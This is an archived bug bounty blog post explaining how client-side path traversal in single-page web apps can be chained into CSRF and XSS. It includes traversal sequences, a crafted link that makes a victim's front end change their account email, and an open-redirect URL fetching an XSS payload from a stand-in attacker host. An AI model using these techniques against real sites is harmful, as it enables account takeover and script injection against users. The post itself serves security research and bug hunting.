# CSPT

- **Source URL:** https://medium.com/@68abdelrahmanmohamed/cspt-your-way-to-xss-csrf-in-modern-apps-59260c8ad19a?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250501120108/https://medium.com/@68abdelrahmanmohamed/cspt-your-way-to-xss-csrf-in-modern-apps-59260c8ad19a?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/8989 (id 8989)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# CSPT: Your way to XSS & CSRF in Modern Apps

# Preface

In this blog, I will discuss how to utilize Client Side Path Traversal, to achieve classic client side attacks such as XSS & CSRF in Client Side Rending Based Web Applications such (React, Vue, Angular, … )

## Client Side Rendering

Apps that utilize this architecture, fetches a JS file from the backend (ex: main.js). This file contains all the logic, it is responsible for crafting valid requests to access resources and perform actions on them.

The key concept here is that the main.js crafts valid requests (Contains CSRF Headers, are Sent with proper Content type, … )

The idea behind CSRF is that we want our attacker website craft a valid State Changing Request.

For example, it is theoretically impossible to perform CSRF on this request with valid CORS Configurations

```
PUT /updateProfile/
Host: backend.com
Content-Type: application/json
X-CSRF-Token: xnujashdajlshdasddla
{"email":"attacker@gmail.com"}
```
Because we can’t control the Content-Type header and the request method, with triggering a CORS Preflight Request, let alone finding a way to predict the CSRF Token.

## Unless ….

We let the front end craft the request for us, and send it on our behalf.

Because the front end’s job is to craft valid requests !

# CSPT

Client Side Path Traversal happens when the front end uses a user input source (URL\_PATH, Query Parameter, URL\_Fragment) to craft a backend request path.

Example:

When a User reads a message, the front end sends a PUT request to update its status to seen.

This way we can insert traversal sequence for example:

```
../otherEndpoint
..\otherEndpoint
%2e%2e%2f%2e%2e%2fotherEndpoint
```
Some of you may say that there is no problem in this, because if I want the user to send a request to “otherEndpoint”, I can just give him this link “https://backend.com/otherEndpoint”

Remember that when the front sends our request, it will be a VALID HTTP REQUEST (Content-Type, CSRF Headers ) are set correctly.

For example, we can try something like this:

If we send a victim this request to view a message

[https://backend.com/message/../updateProfile](https://web.archive.org/web/20250501120108/https://backend.com/updateProfile)?email=attacker@gmail.com

The resulting request will be:

```
PUT /updateProfile/?email=attacker@gmail.com
Host: backend.com
Content-Type: application/json
X-CSRF-Token: xnujashdajlshdasddla
{"seen":"True"}
```
This way we may change his email address.

(Assuming that the endpoint is LAX about having extra body and accepts Query Parameters)

(Note: Most GraphQL Endpoints accepts Mutation Requests via Query Parameters !)

# XSS

Another great attack victor is XSS.

Lets say that when I visit the home page with /?lang=en

The front end sends a request to fetch English JSON data

Then sets the response in the front end.

`element.innerHTML = response` We want to traverse to another endpoint that returns malicious JSON data

## Uploaded Files

We can look for endpoints where we can upload data, for example we can upload a public profile picture that contains our XSS JSON response

`GET /?lang=profilePic#`
So the front End sends

`GET /profilePic#.json`
Then renders our XSS payload in the response !

## Open Redirects

A lot of Bug Bounty Programs don’t offer bounties for open redirects, due to their limited impact.

We can also utilize endpoints vulnerable to open redirects to server our XSS JSON Response.

`GET /?lang=redirect?url=https://attacker.com/XSS.JSON#`
## Summary

Next time you find the front end crafting a request’s path with a user input think about two things:

1. Is this a State Changing Request => Traverse to another state changing endpoint.
2. Is this a resource being placed in a dangerous sink without sanitization => Traverse to another endpoint to delever XSS Attack.
